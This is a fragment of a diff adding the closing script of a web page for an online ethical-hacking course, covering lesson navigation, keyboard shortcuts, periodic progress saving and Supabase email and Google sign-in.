+        window.addEventListener("click", (e) => {
+          if (!e.target.closest("#music-dropdown")) {
+            dropdown.style.display = "none";
+          }
+        });
+      }
+
+      // Show initial music indicator
+      function addMusicIndicator() {
+        const musicBtn = document.querySelector("#music-dropdown");
+        if (musicBtn) {
+          const indicator = document.createElement("div");
+          indicator.className = "music-indicator";
+          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;
+
+          musicBtn.style.position = "relative";
+          musicBtn.appendChild(indicator);
+
+          setTimeout(() => indicator.remove(), 3000);
+        }
+      }
+
+      // Initialize Event Listeners
+      function initializeEventListeners() {
+        // Navigation buttons
+        document
+          .getElementById("prevLessonBtn")
+          ?.addEventListener("click", goToPreviousLesson);
+        document
+          .getElementById("nextLessonBtn")
+          ?.addEventListener("click", goToNextLesson);
+
+        // Reset progress button
+        document
+          .getElementById("resetProgressBtn")
+          ?.addEventListener("click", resetProgress);
+
+        // Mobile menu toggle
+        document
+          .getElementById("menuToggle")
+          ?.addEventListener("click", toggleSidebar);
+        document
+          .getElementById("sidebarOverlay")
+          ?.addEventListener("click", closeSidebar);
+
+        // Keyboard shortcuts
+        document.addEventListener("keydown", handleKeyboardShortcuts);
+
+        // Window resize handler
+        window.addEventListener("resize", handleWindowResize);
+
+        // Content interaction tracking
+        document.getElementById("contentBody")?.addEventListener(
+          "scroll",
+          debounce(() => {
+            trackUserInteraction();
+          }, 1000)
+        );
+      }
+
+      // Keyboard Shortcuts
+      function handleKeyboardShortcuts(e) {
+        if (document.querySelector(".quiz-question.active")) return;
+
+        if (e.key === "ArrowLeft" && e.ctrlKey) {
+          e.preventDefault();
+          goToPreviousLesson();
+        } else if (e.key === "ArrowRight" && e.ctrlKey) {
+          e.preventDefault();
+          goToNextLesson();
+        }
+      }
+
+      // Window Resize Handler
+      function handleWindowResize() {
+        if (window.innerWidth > 768) {
+          closeSidebar();
+        }
+      }
+
+      // Debounce Helper
+      function debounce(func, wait) {
+        let timeout;
+        return function executedFunction(...args) {
+          const later = () => {
+            clearTimeout(timeout);
+            func(...args);
+          };
+          clearTimeout(timeout);
+          timeout = setTimeout(later, wait);
+        };
+      }
+
+      // Initialize responsive behavior
+      if (window.innerWidth <= 768) {
+        document.getElementById("menuToggle").style.display = "inline-flex";
+      }
+
+      // Auto-save progress periodically
+      setInterval(async () => {
+        if (currentUser && Object.keys(courseProgress).length > 0) {
+          await saveProgress();
+        }
+      }, 60000); // Save every minute
+
+      // System initialization logging
+      console.log("CyberSec Academy Course System Initialized");
+      console.log("Current Course:", COURSE_DATA.title);
+      console.log("Total Lessons:", COURSE_DATA.lessons.length);
+
+      // Google OAuth Integration
+      const googleBtn = document.querySelector(".btn-google");
+      if (googleBtn) {
+        googleBtn.addEventListener("click", async () => {
+          const { data, error } = await supabase.auth.signInWithOAuth({
+            provider: "google",
+            options: {
+              redirectTo: window.location.origin + "/courses/ethical-hacking-fundamentals",
+            },
+          });
+
+          if (error) {
+            console.error("Google login error:", error.message);
+            showToast("Google login failed: " + error.message, "error");
+          }
+        });
+      }
+
+      // Check for existing session
+      supabase.auth.getSession().then(({ data }) => {
+        if (data.session) {
+          console.log("User already logged in:", data.session.user);
+          currentUser = data.session.user;
+          startCourseSession();
+        }
+      });
+
+      // Add missing auth modal functions
+      function openAuthModal() {
+        const modal = document.getElementById("authModal");
+        if (modal) {
+          modal.style.display = "flex";
+        }
+      }
+
+      function closeAuthModal() {
+        const modal = document.getElementById("authModal");
+        if (modal) {
+          modal.style.display = "none";
+        }
+      }
+
+      // Add auth tab switching functionality
+      document.getElementById("tabSignIn")?.addEventListener("click", () => {
+        document.getElementById("tabSignIn").classList.add("active");
+        document.getElementById("tabSignUp").classList.remove("active");
+        document.getElementById("signInForm").style.display = "block";
+        document.getElementById("signUpForm").style.display = "none";
+      });
+
+      document.getElementById("tabSignUp")?.addEventListener("click", () => {
+        document.getElementById("tabSignUp").classList.add("active");
+        document.getElementById("tabSignIn").classList.remove("active");
+        document.getElementById("signUpForm").style.display = "block";
+        document.getElementById("signInForm").style.display = "none";
+      });
+
+      document
+        .getElementById("closeAuthModal")
+        ?.addEventListener("click", closeAuthModal);
+
+      // Improved error handling for auth session
+      supabase.auth.onAuthStateChange((event, session) => {
+        if (event === "SIGNED_IN") {
+          currentUser = session.user;
+          closeAuthModal();
+          startCourseSession();
+        } else if (event === "SIGNED_OUT") {
+          currentUser = null;
+          openAuthModal();
+        }
+      });
+
+      // Add form submission handlers
+      document
+        .getElementById("emailSignInForm")
+        ?.addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const email = document.getElementById("signInEmail").value;
+          const password = document.getElementById("signInPassword").value;
+
+          try {
+            const { data, error } = await supabase.auth.signInWithPassword({
+              email,
+              password,
+            });
+
+            if (error) throw error;
+
+            closeAuthModal();
+          } catch (error) {
+            showToast(error.message, "error");
+          }
+        });
+
+      document
+        .getElementById("emailSignUpForm")
+        ?.addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const email = document.getElementById("signUpEmail").value;
+          const password = document.getElementById("signUpPassword").value;
+          const name = document.getElementById("signUpName").value;
+
+          try {
+            const { data, error } = await supabase.auth.signUp({
+              email,
+              password,
+              options: {
+                data: {
+                  full_name: name,
+                },
+              },
+            });
+
+            if (error) throw error;
+
+            showToast(
+              "Account created successfully! Please check your email.",
+              "success"
+            );
+          } catch (error) {
+            showToast(error.message, "error");
+          }
+        });
+    </script>
+  </body>
+</html>
+
